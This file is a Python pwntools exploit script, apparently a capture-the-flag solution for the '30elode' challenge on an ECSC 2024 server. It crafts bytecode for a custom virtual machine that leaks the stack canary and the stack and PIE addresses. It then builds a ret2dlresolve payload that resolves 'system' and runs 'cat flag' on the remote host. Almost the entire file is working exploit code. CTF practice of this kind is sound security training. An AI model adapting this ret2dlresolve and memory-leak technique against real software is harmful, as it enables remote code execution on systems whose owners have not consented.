#!/usr/bin/env python3

import logging
import os
from pwn import *

logging.disable()

filename = os.path.join(os.path.dirname(__file__), "30elode")
exe = context.binary = ELF(args.EXE or filename, checksec=False)
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

HOST = os.environ.get("HOST", "30elode.challs.external.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38301))

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    else:
        return remote(HOST, PORT)

gdbscript = '''
set follow-fork-mode child
b vm
c
'''.format(**locals())

# ==========================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

OPCODE_ADD = 0x0
OPCODE_SUB = 0x1
OPCODE_MUL = 0x2
OPCODE_DIV = 0x3
OPCODE_AND = 0x4
OPCODE_OR =  0x5
OPCODE_XOR = 0x6
OPCODE_SHL = 0x7
OPCODE_SHR = 0x8
OPCODE_PUSH = 0x9
OPCODE_POP = 0xa
OPCODE_MOV = 0xb
OPCODE_SAVE = 0xc
OPCODE_RESTORE = 0xd
OPCODE_SET = 0xe
SIZE_IMM_8 = 0x0
SIZE_IMM_16 = 0x1
SIZE_REG = 0x2

full = b""

def binary(opcode, src, dst):
    global full
    payload = p8(opcode)
    payload += p8(src << 4 | dst)
    payload = payload.ljust(4, b"\x00")
    full += payload

def push_imm_8(imm):
    global full
    payload = p8(OPCODE_PUSH)
    payload += p8(SIZE_IMM_8)
    payload += p8(imm)
    payload = payload.ljust(4, b"\x00")
    full += payload

def push_imm_16(imm):
    global full
    payload = p8(OPCODE_PUSH)
    payload += p8(SIZE_IMM_16)
    payload += p16(imm)
    full += payload

def push_imm_32(imm):
    push_imm_16(imm >> 16)
    push_imm_16(imm & 0xffff)

def push_imm_64(imm):
    push_imm_32(imm >> 32)
    push_imm_32(imm & 0xffffffff)

def push_reg(reg):
    global full
    payload = p8(OPCODE_PUSH)
    payload += p8(SIZE_REG)
    payload += p16(reg)
    full += payload

def pop(reg):
    global full
    payload = p8(OPCODE_POP)
    payload += p8(reg)
    payload = payload.ljust(4, b"\x00")
    full += payload

def save():
    global full
    payload = p8(OPCODE_SAVE)
    payload = payload.ljust(4, b"\x00")
    full += payload

def restore():
    global full
    payload = p8(OPCODE_RESTORE)
    payload = payload.ljust(4, b"\x00")
    full += payload

def set(imm, reg):
    global full
    payload = p8(OPCODE_SET)
    payload += p16(imm)
    payload += p8(reg)
    full += payload

restore()   # regs[14] = canary; regs[13] = stack leak; regs[12] = pie leak; regs[11] = reloc_index
LEAK_OFFS = 0x1cfe
PLT_INIT_OFFS = exe.get_section_by_name(".plt").header.sh_addr
print(f"plt_init_offs: {hex(PLT_INIT_OFFS)}")
set(LEAK_OFFS - PLT_INIT_OFFS, 0)
binary(OPCODE_SUB, 12, 0)

dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["whatever"], data_addr=exe.sym["regs"])
print(f"dlresolve.data_addr: {hex(dlresolve.data_addr)}")
print(f"dlresolve.reloc_index: {dlresolve.reloc_index}")

set(dlresolve.reloc_index, 11)
save()

for i in range(0, len(dlresolve.payload) // 8):
    push_imm_64(u64(dlresolve.payload[8*i:8*(i+1)]))
    pop(i)

full += b"cat flag >&2"
if len(full) % 4 != 0:
    full = full.ljust((len(full) // 4 + 1) * 4, b"\x00")
io.sendlineafter(b"Code size (bytes): ", str(len(full)).encode())
io.sendafter(b"Code: ", full)

if args.GDB:
    io.interactive()
else:
    res = io.recvuntil(b"flag{").strip()
    print('flag{' + io.recvuntil(b'}').strip().decode())
    io.close()
